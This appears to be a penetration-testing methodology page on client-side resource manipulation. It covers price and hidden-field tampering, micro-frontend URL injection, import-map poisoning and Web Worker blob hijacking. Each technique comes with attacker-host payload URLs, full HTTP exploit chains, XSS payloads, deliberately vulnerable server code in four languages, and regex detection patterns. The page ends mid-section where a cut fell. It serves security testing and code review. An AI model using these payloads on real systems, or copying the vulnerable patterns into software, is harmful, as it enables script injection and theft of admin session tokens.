# Client Side Resource Manipulation

## Check List

## Methodology

### Black Box

#### JavaScript Price Manipulation

{% stepper %}
{% step %}
Login to your account
{% endstep %}

{% step %}
Open the product page and inspect client-side JavaScript
{% endstep %}

{% step %}
Identify pricing logic inside JS file

```http
GET /static/app.js HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Locate price calculation function

```js
function calculateTotal(price, quantity){
   return price * quantity;
}
```
{% endstep %}

{% step %}
Add product to cart and intercept request

```http
POST /api/cart/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"productId":101,"quantity":1,"total":100}
```
{% endstep %}

{% step %}
Modify total value

```json
{"productId":101,"quantity":1,"total":1}
```
{% endstep %}

{% step %}
Forward the request, Proceed to checkout
{% endstep %}

{% step %}
If backend accepts manipulated total without recalculating server-side, client-side resource manipulation is confirmed
{% endstep %}
{% endstepper %}

***

#### Hidden Form Field Manipulation

{% stepper %}
{% step %}
Login as a normal user
{% endstep %}

{% step %}
Access profile update page, Inspect hidden input fields in HTML

```html
<input type="hidden" name="accountType" value="basic">
```
{% endstep %}

{% step %}
Intercept profile update request

```http
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

username=user1&accountType=basic
```
{% endstep %}

{% step %}
Modify hidden parameter

```http
username=user1&accountType=premium
```
{% endstep %}

{% step %}
Forward the request, If account privileges change based on modified hidden field without server validation, manipulation vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### JavaScript-Based Access Control

{% stepper %}
{% step %}
Login as normal user
{% endstep %}

{% step %}
Inspect JavaScript file for role-based UI control

```js
if(user.role === "admin"){
   showAdminPanel();
}
```
{% endstep %}

{% step %}
Manually modify role value in browser console

```js
user.role="admin"
showAdminPanel();
```
{% endstep %}

{% step %}
Access admin endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If backend does not validate role and grants access based on client-side state, access control depends on client resources
{% endstep %}

{% step %}
If privilege escalation occurs due to client-side modification, resource manipulation vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Micro-Frontend (MFE) Subversion via Dynamic RemoteEntry Injection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on hyper-scale Single Page Applications (SPAs) that utilize Webpack 5 Module Federation or Vite to decompose a monolithic frontend into dozens of independent Micro-Frontends (MFEs)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's frontend bootstrap sequence and backend workspace configuration APIs
{% endstep %}

{% step %}
Identify the "Dynamic Remote Resolution" architecture. Hardcoding the URLs of 50 different micro-frontends into the shell application requires a full shell redeployment every time an individual MFE team releases a new version
{% endstep %}

{% step %}
Investigate the deployment optimization. To achieve independent, frictionless deployments, the shell application queries the backend API during initialization (e.g., `GET /api/v1/workspace/mfe-config`). The backend returns a JSON payload containing a map of MFE names to their respective `remoteEntry.js` URLs
{% endstep %}

{% step %}
Analyze the frontend loading sink. The SPA parses the JSON response and dynamically constructs `<script>` tags, injecting them into the DOM to fetch and execute the remote Webpack modules
{% endstep %}

{% step %}
Discover the fatal trust boundary collapse: To support "Custom Plugins" or "Beta Opt-Ins," the backend API permits Tenant Administrators or individual users to define custom MFE integration URLs via an administrative endpoint
{% endstep %}

{% step %}
Understand the architectural assumption: The backend developer explicitly assumes that supplying a URL simply dictates resource fetching. They fail to recognize that in a Module Federation architecture, pointing to an external JavaScript file is mathematically equivalent to arbitrary Cross-Site Scripting (XSS). They omit strict schema validation, hostname whitelisting, and Subresource Integrity (SRI) checks
{% endstep %}

{% step %}
Formulate the CSRM payload. You must spin up an attacker-controlled server that hosts a malicious Webpack `remoteEntry.js` file exposing an identical component interface to the legitimate MFE
{% endstep %}

{% step %}
Navigate to the Tenant Configuration or Integration Settings API
{% endstep %}

{% step %}
Submit a payload overriding a core module's URL with your malicious URL: `{"moduleName": "BillingDashboard", "integrationUrl": "[https://attacker.com/remoteEntry.js](https://attacker.com/remoteEntry.js)"}`
{% endstep %}

{% step %}
The backend securely persists the configuration into the database, performing zero network-level validation
{% endstep %}

{% step %}
Distribute a link to the shared workspace to an Enterprise Super-Admin
{% endstep %}

{% step %}
The victim accesses the workspace. The shell application queries the backend for the MFE configuration. The backend returns your poisoned URL
{% endstep %}

{% step %}
The shell application executes the dynamic import: `injectScript("[https://attacker.com/remoteEntry.js](https://attacker.com/remoteEntry.js)")`. The browser fetches the attacker's module, executing full Client-Side Resource Manipulation (CSRM). The malicious component silently harvests local storage tokens and DOM state, establishing persistent execution within the highly privileged enterprise context

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(public\s+(string|Uri)\s+IntegrationUrl\s*\{\s*get;\s*set;\s*\})|(IntegrationUrl\s*\{\s*get;\s*set;\s*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@Column\(\s*name\s*=\s*["']integration_url["']\s*\))|(private\s+String\s+integrationUrl)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$tenant->integration_url\s*=\s*\$request->input\(['"]url['"]\))|(\$.*->integration_url\s*=.*\$request)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(integrationUrl\s*:\s*req\.body\.url)|(integrationUrl\s*:\s*req\.(body|query)\.)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
public\s+(string|Uri)\s+IntegrationUrl\s*\{\s*get;\s*set;\s*\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
public\s+(string|Uri)\s+IntegrationUrl\s*\{\s*get;\s*set;\s*\}
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$tenant->integration_url\s*=\s*\$request->input\('url'\)|\$.*integration_url\s*=.*\$request
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
integrationUrl:\s*req\.(body|query)\.
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/workspace/integrations")]
public async Task<IActionResult> UpdatePlugin([FromBody] PluginDto request)
{
    var workspace = await _dbContext.Workspaces.FindAsync(User.GetWorkspaceId());

    // [1]
    // [2]
    // [3]
    // [4]
    // Storing the untrusted URL directly into the database.
    workspace.CustomPluginUrl = request.PluginUrl;
    await _dbContext.SaveChangesAsync();

    return Ok();
}

[HttpGet("/api/v1/workspace/mfe-config")]
public async Task<IActionResult> GetMfeConfig()
{
    var workspace = await _dbContext.Workspaces.FindAsync(User.GetWorkspaceId());

    return Ok(new Dictionary<string, string>
    {
        { "core", "https://cdn.enterprise.tld/core/remoteEntry.js" },
        { "plugin", workspace.CustomPluginUrl }
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class MfeConfigController {

    @Autowired
    private WorkspaceRepository workspaceRepo;

    @PostMapping("/api/v1/workspace/integrations")
    public ResponseEntity<?> updatePlugin(@RequestBody PluginRequest request, Principal principal) {
        Workspace workspace = workspaceRepo.findById(principal.getName()).orElseThrow();
        
        // [1]
        // [2]
        // [3]
        // [4]
        workspace.setCustomPluginUrl(request.getPluginUrl());
        workspaceRepo.save(workspace);

        return ResponseEntity.ok().build();
    }

    @GetMapping("/api/v1/workspace/mfe-config")
    public ResponseEntity<?> getMfeConfig(Principal principal) {
        Workspace workspace = workspaceRepo.findById(principal.getName()).orElseThrow();
        
        Map<String, String> config = new HashMap<>();
        config.put("core", "https://cdn.enterprise.tld/core/remoteEntry.js");
        config.put("plugin", workspace.getCustomPluginUrl());
        
        return ResponseEntity.ok(config);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class MfeConfigController extends Controller
{
    public function updatePlugin(Request $request)
    {
        $workspace = auth()->user()->workspace;

        // [1]
        // [2]
        // [3]
        // [4]
        $workspace->custom_plugin_url = $request->input('plugin_url');
        $workspace->save();

        return response()->json(['status' => 'Updated']);
    }

    public function getMfeConfig()
    {
        $workspace = auth()->user()->workspace;

        return response()->json([
            'core' => 'https://cdn.enterprise.tld/core/remoteEntry.js',
            'plugin' => $workspace->custom_plugin_url
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/workspace/integrations', async (req, res) => {
    // [1]
    // [2]
    // The backend allows tenants to register custom MFE plugins for internal tools.
    let customUrl = req.body.pluginUrl;

    // [3]
    // [4]
    // Fatal Omission: No URL parsing, no domain whitelisting, no protocol enforcement.
    // The backend assumes the frontend will handle security, but the frontend blindly trusts the backend.
    await Workspace.update(
        { customPluginUrl: customUrl },
        { where: { id: req.user.workspaceId } }
    );

    res.send({ status: 'Updated' });
});

router.get('/api/v1/workspace/mfe-config', async (req, res) => {
    let workspace = await Workspace.findByPk(req.user.workspaceId);
    
    res.json({
        core: "https://cdn.enterprise.tld/core/remoteEntry.js",
        billing: "https://cdn.enterprise.tld/billing/remoteEntry.js",
        plugin: workspace.customPluginUrl // Attacker-controlled URL reflected
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture decomposes the frontend monolith into micro-frontends (MFEs), requiring dynamic client-side module resolution to compose the final DOM, \[2] To support B2B customization, the platform permits organizational tenants to inject bespoke internal tooling components via Webpack Module Federation, \[3] The backend API accepts the remote URL string. Developers assume that because this is merely a configuration setting—not raw HTML or SQL—it poses no immediate server-side execution risk, \[4] The execution sink. The backend functions as an obfuscation tunnel for a Client-Side Resource Manipulation payload. By failing to restrict the `pluginUrl` to trusted enterprise CDNs (e.g., verifying it matches `^https://cdn\.enterprise\.tld/`), the backend permanently weaponizes the workspace configuration. When victims visit the workspace, the shell application blindly trusts the backend's configuration and invokes the malicious JavaScript payload from the attacker's server, circumventing all standard XSS protections and Content Security Policies that do not explicitly lock down `script-src`

```http
// 1. Attacker compiles a malicious Webpack MFE that exposes the required React/Vue components 
//    but contains a hidden payload designed to exfiltrate localStorage tokens.
// 2. Attacker hosts the bundle at https://evil.com/mfe/remoteEntry.js.
// 3. Attacker updates their tenant workspace integration settings.

POST /api/v1/workspace/integrations HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "pluginUrl": "https://evil.com/mfe/remoteEntry.js"
}

// 4. The backend stores the URL.
// 5. Attacker invites a global Enterprise Support Admin to review an "issue" in the workspace.
// 6. The Support Admin logs in and loads the workspace.
// 7. The Frontend SPA queries the backend configuration:

GET /api/v1/workspace/mfe-config HTTP/1.1
Host: api.enterprise.tld

// 8. The backend returns the poisoned JSON configuration.
HTTP/1.1 200 OK
Content-Type: application/json

{
  "core": "https://cdn.enterprise.tld/core.js",
  "plugin": "https://evil.com/mfe/remoteEntry.js"
}

// 9. The SPA executes dynamic import:
// const element = document.createElement("script");
// element.src = "https://evil.com/mfe/remoteEntry.js";
// document.head.appendChild(element);

// 10. The browser fetches and executes the attacker's code inside the Admin's session.
```
{% endstep %}

{% step %}
To orchestrate decentralized frontend deployments and highly customized B2B dashboards, software architects implemented dynamic micro-frontend resolution. This optimization shifted module routing logic out of the client's build process and into a stateful, backend-driven configuration payload. The security posture incorrectly classified resource URLs as inert metadata, entirely divorcing the configuration validation from its ultimate client-side execution context. The attacker exploited this semantic gap by injecting an external domain into the workspace integration settings. The backend persisted the payload without enforcing origin whitelisting. Upon subsequent visits, the frontend shell consumed the poisoned configuration and generated an active `<script>` execution sink. This architectural failure allowed the attacker to achieve deterministic DOM execution across highly privileged administrative sessions via pure Client-Side Resource Manipulation
{% endstep %}
{% endstepper %}

***

#### Browser Module Hijacking via Stateful Import Map Serialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern Server-Side Rendered (SSR) frameworks (e.g., Next.js, Nuxt.js) or platforms utilizing ES Modules (ESM) natively in the browser without a bundler
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the HTML generation sequence and A/B Testing infrastructure
{% endstep %}

{% step %}
Identify the "Dynamic Import Map" architecture. Modern browsers support `<script type="importmap">`, which allows applications to map "bare module specifiers" (e.g., `import React from 'react'`) to highly specific, versioned URLs hosted on CDNs
{% endstep %}

{% step %}
Investigate the Experimentation optimization. To execute high-speed A/B tests on core libraries (e.g., testing a new version of the UI component library) without rebuilding and invalidating the entire global CDN cache, developers inject the import map dynamically via the backend Server-Side Rendering engine
{% endstep %}

{% step %}
Analyze the state materialization. The backend determines the user's active experiments by querying their user profile, a local cookie, or an internal Feature Flag database. It iterates over these experiments and appends the overridden module URLs directly into the JSON structure of the import map within the HTML `<head>`
{% endstep %}

{% step %}
Discover the fatal configuration overwrite: The developer strictly validates the _keys_ of the import map (e.g., ensuring only `lodash`, `react`, or `@enterprise/ui` can be overridden) to prevent attackers from introducing unrecognized modules. However, they implicitly trust the _values_ (the URLs) associated with these experiments
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker can manipulate their user profile or experiment cookie (e.g., via a Mass Assignment vulnerability or a missing integrity check on client-side experiment state), they can supply a custom URL for a highly trusted core library
{% endstep %}

{% step %}
Formulate the Import Map Override payload. Identify an API endpoint that updates user preferences or active experiments
{% endstep %}

{% step %}
Construct a JSON payload that targets a fundamental frontend module and maps it to a malicious URL containing a trojanized version of that module. Payload: `{"experiments": {"@enterprise/ui": "[https://attacker.com/malicious-ui.js](https://attacker.com/malicious-ui.js)"}}`
{% endstep %}

{% step %}
Submit the payload to the backend. The backend saves the experiment state into the database
{% endstep %}

{% step %}
Navigate to the application's core dashboard
{% endstep %}

{% step %}
The backend SSR engine constructs the HTML response. It parses the user's active experiments
{% endstep %}

{% step %}
The backend blindly serializes the attacker's URL into the import map: `<script type="importmap">{"imports": {"@enterprise/ui": "[https://attacker.com/malicious-ui.js](https://attacker.com/malicious-ui.js)"}}</script>`
{% endstep %}

{% step %}
The browser receives the HTML. When the main application code executes `import { Button } from '@enterprise/ui';`, the browser's native module resolution engine intercepts the bare specifier, consults the poisoned import map, and silently redirects the resource fetch to the attacker's domain, resulting in absolute execution hijacking prior to any application logic executing

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(<script\s+type=["']importmap["']>\s*\{\{\s*model\.[A-Za-z]+Map\s*\}\})|(<script\s+type=["']importmap["']>.*model\.)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(out\.print\(\s*"<script\s+type=\\"importmap\\">"\s*\+\s*[A-Za-z]+ImportMap)|(generateImportMap\(.*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$html\s*\.=\s*["']<script\s+type=['"]importmap['"]>["']\s*\.\s*json_encode\(\$[A-Za-z]+\))|(\$html.*json_encode\(.*imports)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(res\.send\(`.*<script\s+type=["']importmap["']\$\{JSON\.stringify\([A-Za-z]+\)\}`\))|(JSON\.stringify\(.*importMap)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
<script\s+type=\"importmap\">\s*\{\{\s*model\.[A-Za-z]+Map\s*\}\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
out\.print\(\"<script\s+type=\\\"importmap\\\">\"\s*\+\s*generateImportMap
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$html\s*\.=\s*\"<script\s+type='importmap'>\"\s*\.\s*json_encode\(\$imports\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.send\(`.*<script\s+type=\"importmap\">\$\{JSON\.stringify\(importMap\)\}`\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/dashboard")]
public async Task<IActionResult> GetDashboard()
{
    var user = await _dbContext.Users.FindAsync(User.GetUserId());

    // [1]
    // [2]
    // Default module mappings
    var importMap = new Dictionary<string, string>
    {
        { "react", "https://cdn.enterprise.tld/react.js" },
        { "@enterprise/ui", "https://cdn.enterprise.tld/ui.js" }
    };

    // [3]
    // [4]
    // Developer deserializes the user's active experiments from the database.
    // If the user modified this JSON via a Mass Assignment vulnerability on their profile,
    // the backend blindly incorporates the attacker's URLs into the critical mapping structure.
    var userExperiments = JsonConvert.DeserializeObject<Dictionary<string, string>>(user.ExperimentsJson);
    if (userExperiments != null)
    {
        foreach (var exp in userExperiments)
        {
            importMap[exp.Key] = exp.Value; // Overwrites default mapping
        }
    }

    var model = new DashboardViewModel 
    { 
        ImportMapJson = JsonConvert.SerializeObject(new { imports = importMap }) 
    };

    return View("Dashboard", model);
}

// Razor View (Dashboard.cshtml):
// <script type="importmap">@Html.Raw(Model.ImportMapJson)</script>
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/dashboard")
public String dashboard(Model model, Principal principal) throws Exception {
    User user = userRepository.findByUsername(principal.getName());

    // [1]
    // [2]
    Map<String, String> imports = new HashMap<>();
    imports.put("vue", "https://cdn.enterprise.tld/vue.js");
    imports.put("api-client", "https://cdn.enterprise.tld/api.js");

    // [3]
    // [4]
    ObjectMapper mapper = new ObjectMapper();
    Map<String, String> experiments = mapper.readValue(user.getExperimentsJson(), new TypeReference<Map<String, String>>(){});
    
    imports.putAll(experiments);

    Map<String, Object> importMap = new HashMap<>();
    importMap.put("imports", imports);

    model.addAttribute("importMapJson", mapper.writeValueAsString(importMap));
    return "dashboard"; // Thymeleaf resolves the string into the <script type="importmap"> tag
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class DashboardController extends Controller
{
    public function index(Request $request)
    {
        $user = $request->user();

        // [1]
        // [2]
        $imports = [
            'jquery' => 'https://cdn.enterprise.tld/jquery.js',
            'components' => 'https://cdn.enterprise.tld/components.js'
        ];

        // [3]
        // [4]
        $experiments = json_decode($user->experiments_json, true) ?: [];
        $imports = array_merge($imports, $experiments);

        $importMap = ['imports' => $imports];

        return view('dashboard', ['importMapJson' => json_encode($importMap)]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/dashboard', async (req, res) => {
    let user = await User.findByPk(req.user.id);

    // [1]
    // [2]
    let imports = {
        "lodash": "https://cdn.enterprise.tld/lodash.js",
        "core": "https://cdn.enterprise.tld/core.js"
    };

    // [3]
    // [4]
    let activeOverrides = JSON.parse(user.experimentOverrides || '{}');
    
    // Attacker-controlled URLs overwrite the fundamental module paths
    Object.assign(imports, activeOverrides);

    let importMap = { imports: imports };

    // Injects the import map directly into the DOM
    res.send(`
        <html>
        <head>
            <script type="importmap">${JSON.stringify(importMap)}</script>
        </head>
        <body>
            <script type="module" src="https://cdn.enterprise.tld/app.js"></script>
        </body>
        </html>
    `);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application abandons traditional bundling in favor of native Browser ES Modules, relying on `<script type="importmap">` to resolve dependencies efficiently across the network, \[2] To support rapid A/B testing and localized canary rollouts, architects generate the import map dynamically on the server-side, fetching overrides based on the active user's state ,\[3] The architecture relies entirely on the assumption that experiment configurations are strictly populated by internal administrative pipelines and represent safe, verified CDN URIs, \[4] The execution sink. A secondary vulnerability (such as Mass Assignment on the User Profile endpoint) permits an attacker to manually populate their experiment configuration blob. The backend retrieves this blob and blindly merges the attacker's URLs over the default module paths. When the HTML is rendered, the browser's native module resolution engine encounters the poisoned import map. Any subsequent generic `import` statement executed by the legitimate application code is silently hijacked, instructing the browser to fetch and execute the attacker's trojanized module from an external domain

```http
// 1. Attacker exploits a Mass Assignment vulnerability on their profile endpoint 
//    to modify the internal 'experimentsJson' field.

PUT /api/v1/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "experimentsJson": "{\"@enterprise/ui\": \"https://evil.com/malicious-ui.js\"}"
}

// 2. The backend merges the payload into the database.
// 3. The attacker navigates to the core dashboard.

GET /dashboard HTTP/1.1
Host: www.enterprise.tld

// 4. The backend SSR engine constructs the Import Map.
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head>
    <script type="importmap">
    {
      "imports": {
        "react": "https://cdn.enterprise.tld/react.js",
        "@enterprise/ui": "https://evil.com/malicious-ui.js"
      }
    }
    </script>
</head>
<body>
    <script type="module">
        // 5. The legitimate application code executes.
        import { AdminToolbar } from '@enterprise/ui'; 
        
        // 6. The browser intercepts the bare specifier '@enterprise/ui'.
        // 7. The browser queries the import map.
        // 8. The browser fetches "https://evil.com/malicious-ui.js" instead of the CDN.
        // 9. The attacker's script executes natively, achieving complete DOM takeover.
        AdminToolbar.render();
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To accelerate UI testing and decouple dependency resolution from static frontend builds, enterprise engineers deployed dynamic Import Maps driven by server-side state evaluation. This architecture allowed the application to remap fundamental library imports on the fly based on user telemetry. The security framework failed by equating dependency resolution with inert configuration mapping. Developers assumed that the origin of the configuration payload was perpetually safe, omitting origin validation (e.g., restricting URLs to `*.enterprise.tld`). By leveraging an input validation flaw, the attacker injected arbitrary URIs into their experiment state. The backend serialized these URIs into the critical `importmap` block within the HTML `<head>`. When the browser's native ES Module resolver evaluated the application's legitimate import statements, it deferred to the poisoned map, actively fetching and executing the attacker's hostile code instead of the trusted library, generating an invisible, structural execution hijack
{% endstep %}
{% endstepper %}

***

#### Execution Context Escaping via Cross-Origin Web Worker Blob Hydration

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on data-heavy web applications that perform massive client-side computation (e.g., in-browser CSV parsing, cryptographic signing, video transcoding, or data visualization)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the client-side threading model and backend configuration endpoints
{% endstep %}

{% step %}
Identify the "Client-Side Offloading" architecture. Processing a 50MB dataset on the main browser thread causes the UI to permanently freeze. To resolve this, developers offload the parsing logic to a Web Worker (`new Worker()`)
{% endstep %}

{% step %}
Investigate the Cross-Origin Worker limitation. Modern browsers enforce strict Same-Origin Policies (SOP) on Web Workers; you cannot simply execute `new Worker('[https://external-cdn.com/worker.js](https://external-cdn.com/worker.js)')`
{% endstep %}

{% step %}
Discover the "Blob Hydration" architectural workaround. To support loading worker scripts from external CDNs, multi-tenant subdomains, or custom third-party integrations, the developer implements a common proxy pattern: The frontend executes an HTTP `fetch()` to retrieve the JavaScript file as a raw text string, converts the string into an immutable `Blob`, generates a local URL using `URL.createObjectURL()`, and instantiates the Worker from that local URL
{% endstep %}

{% step %}
Analyze the configuration retrieval pipeline. The URL passed into the `fetch()` command is not hardcoded. It is retrieved dynamically from the backend API based on the tenant's configuration (e.g., allowing tenants to specify a `CustomDataParserUrl` to handle proprietary file&#x20;
{% endstep %}

{% step %}
Understand the Cross-Origin Resource Manipulation vulnerability: Because `fetch()` naturally supports Cross-Origin Resource Sharing (CORS), it will successfully download a JavaScript file from _any_ attacker-controlled domain that returns the `Access-Control-Allow-Origin: *` header. The frontend then blindly converts this malicious payload into a Same-Origin Blob URL and executes it
{% endstep %}

{% step %}
Formulate the Web Worker Hijacking payload. Identify the API endpoint that configures the custom data parser
{% endstep %}

{% step %}
Construct a malicious JavaScript payload designed to be executed inside the Web Worker. Because workers lack direct DOM access, the payload must manipulate the primary application via the `postMessage` synchronization channel. Payload: `postMessage({ type: 'RENDER_DATA', payload: '<img src=x onerror=alert(document.domain)>' })`
{% endstep %}

{% step %}
Host this payload on an external server returning proper CORS headers
{% endstep %}

{% step %}
Submit the custom configuration API request: `{"parserUrl": "[https://attacker.com/malicious-worker.js](https://attacker.com/malicious-worker.js)"}`
{% endstep %}

{% step %}
The backend securely persists the configuration, performing zero validation on the provided schema or domain
{% endstep %}

{% step %}
Navigate to the frontend application and trigger the data processing pipeline (e.g., uploading a dummy CSV file)
{% endstep %}

{% step %}
The frontend queries the backend for the parser configuration. It receives the attacker's URL. The frontend executes the `fetch()` proxy pattern. The browser downloads the malicious script, bypasses the Worker Same-Origin Policy via Blob instantiation, and executes the payload. The worker dispatches the forged `postMessage` back to the main thread. The main thread, implicitly trusting its own worker, consumes the payload and executes it within the primary DOM, achieving cross-boundary DOM XSS via Client-Side Resource Manipulation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(public\s+string\s+ParserUrl\s*\{\s*get;\s*set;\s*\})|(ParserUrl\s*\{\s*get;\s*set;\s*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
(tenant\.setParserUrl\(\s*request\.getUrl\(\)\s*\))|(setParserUrl\(.*getUrl\(\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$tenant->parser_url\s*=\s*\$request->input\(['"]url['"]\))|(\$.*->parser_url\s*=.*\$request)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(parserUrl\s*:\s*req\.body\.url)|(parserUrl\s*:\s*req\.(body|query)\.)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
public\s+string\s+ParserUrl\s*\{\s*get;\s*set;\s*\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
tenant\.setParserUrl\(request\.getUrl\(\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$tenant->parser_url\s*=\s*\$request->input\('url'\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
parserUrl:\s*req\.body\.url
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/tenant/pipeline-config")]
public async Task<IActionResult> UpdateConfig([FromBody] PipelineConfigDto request)
{
    var tenant = await _dbContext.Tenants.FindAsync(User.GetTenantId());

    // [1]
    // [2]
    // [3]
    // [4]
    tenant.ParserUrl = request.ParserUrl;
    await _dbContext.SaveChangesAsync();

    return Ok();
}

[HttpGet("/api/v1/tenant/pipeline-config")]
public async Task<IActionResult> GetConfig()
{
    var tenant = await _dbContext.Tenants.FindAsync(User.GetTenantId());

    return Ok(new 
    {
        ParserUrl = string.IsNullOrEmpty(tenant.ParserUrl) ? "https://cdn.enterprise.tld/default-parser.js" : tenant.ParserUrl
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class PipelineConfigController {

    @Autowired
    private TenantRepository tenantRepo;

    @PostMapping("/api/v1/tenant/pipeline-config")
    public ResponseEntity<?> updateConfig(@RequestBody PipelineConfigRequest request, Principal principal) {
        Tenant tenant = tenantRepo.findById(principal.getName()).orElseThrow();
        
        // [1]
        // [2]
        // [3]
        // [4]
        tenant.setParserUrl(request.getParserUrl());
        tenantRepo.save(tenant);

        return ResponseEntity.ok().build();
    }

    @GetMapping("/api/v1/tenant/pipeline-config")
    public ResponseEntity<?> getConfig(Principal principal) {
        Tenant tenant = tenantRepo.findById(principal.getName()).orElseThrow();
        
        String url = tenant.getParserUrl() != null ? tenant.getParserUrl() : "https://cdn.enterprise.tld/default-parser.js";
        return ResponseEntity.ok(Map.of("parserUrl", url));
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DataPipelineController extends Controller
{
    public function updateConfiguration(Request $request)
    {
        $tenant = auth()->user()->tenant;

        // [1]
        // [2]
        // The backend blindly accepts an external URL for the tenant's custom parser engine
        // [3]
        // [4]
        // Fatal Omission: The backend assumes the browser's Same-Origin Policy will block 
        // external script execution. It fails to restrict the URL to trusted origins.
        $tenant->custom_parser_url = $request->input('parserUrl');
        $tenant->save();

        return response()->json(['status' => 'Updated']);
    }

    public function getConfiguration()
    {
        $tenant = auth()->user()->tenant;
        return response()->json([
            'parserUrl' => $tenant->custom_parser_url ?: 'https://cdn.enterprise.tld/default-parser.js'
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/tenant/pipeline-config', async (req, res) => {
    // [1]
    // [2]
    let parserUrl = req.body.parserUrl;

    // [3]
    // [4]
    // Direct persistence of the attacker-controlled URI
    await Tenant.update(
        { dataParserUrl: parserUrl },
        { where: { id: req.user.tenantId } }
    );

    res.send({ status: 'Updated' });
});

router.get('/api/v1/tenant/pipeline-config', async (req, res) => {
    let tenant = await Tenant.findByPk(req.user.tenantId);
    
    res.json({
        parserUrl: tenant.dataParserUrl || 'https://cdn.enterprise.tld/default-parser.js'
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes massive volumes of raw data directly in the browser to minimize backend compute costs, \[2] To support industry-specific data formats, the platform allows enterprise tenants to define and host their own custom JavaScript parsing algorithms, \[3] The backend API stores the tenant-provided URI string natively, completely delegating the network enforcement and script retrieval logic to the client's browser, \[4] The execution sink. The developers falsely assumed that the browser's native Web Worker Same-Origin Policy (SOP) mathematically prevented cross-domain script execution. They failed to account for common frontend architectural workarounds (Blob Hydration) designed to circumvent this exact limitation. The frontend, designed to execute the backend's authorized configuration, effortlessly fetches the attacker's script via CORS, converts it to a local Blob, and executes it. The Web Worker, operating under the context of the main application, pipes the malicious payload directly back to the primary UI thread, subverting the SOP and resulting in an asynchronous execution hijack

```http
// 1. Attacker hosts a malicious Web Worker script on a server returning broad CORS headers.
// https://evil.com/worker.js:
// self.postMessage({ type: 'PARSED_RESULT', data: '<img src=x onerror=alert(document.domain)>' });

// 2. Attacker modifies the tenant data pipeline configuration.

POST /api/v1/tenant/pipeline-config HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "parserUrl": "https://evil.com/worker.js"
}

// 3. The backend database persists the configuration without origin validation.
// 4. A victim (e.g., an Enterprise Analyst) visits the Data Import dashboard.
// 5. The SPA queries the API to initialize the data pipeline.

GET /api/v1/tenant/pipeline-config HTTP/1.1
Host: api.enterprise.tld

// 6. The API returns: {"parserUrl": "https://evil.com/worker.js"}
// 7. The Frontend SPA executes the architectural Blob hydration workaround:
//
